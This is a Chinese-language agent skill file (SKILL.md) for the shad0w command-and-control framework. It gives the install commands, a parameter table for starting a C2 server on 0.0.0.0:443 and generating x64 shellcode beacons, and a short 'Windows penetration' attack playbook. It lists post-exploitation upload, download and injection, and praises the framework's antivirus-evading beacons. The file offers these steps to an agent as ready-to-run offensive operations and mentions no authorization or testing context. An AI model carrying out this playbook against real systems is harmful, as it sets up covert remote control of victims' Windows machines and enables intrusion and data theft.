---
name: shad0w-c2-windows
description: 渗透工具 skill:shad0w 的安装、参数速查与攻击场景 playbook。当任务涉及 C2框架 需要调用 shad0w 时使用。
when-to-use: 渗透工具 skill:shad0w 的安装、参数速查与攻击场景 playbook。当任务涉及 C2框架 需要调用 shad0w 时使用。
---

# shad0w

- 攻击大类:C35 C2框架
- 上游仓库:https://github.com/bats3c/shad0w
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/bats3c/shad0w && cd shad0w && ./install.sh
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./shad0w -c 0.0.0.0 -p 443` | 启动服务端 |
| `python shad0w.py beacon -p x64/shellcode` | 生成 beacon |
| `stageless/staged` | 载荷类型 |
| `console 内 upload/download/inject` | 后渗透 |

## 攻击场景 Playbook

### Windows 渗透 C2

```bash
./shad0w -c 0.0.0.0 -p 443
python shad0w.py beacon  # 生成载荷投递,console 全控
```

## 注意事项

bats3c 出品的 C2,主打 Windows 后渗透,免杀 beacon+丰富模块,控制台为 Python。
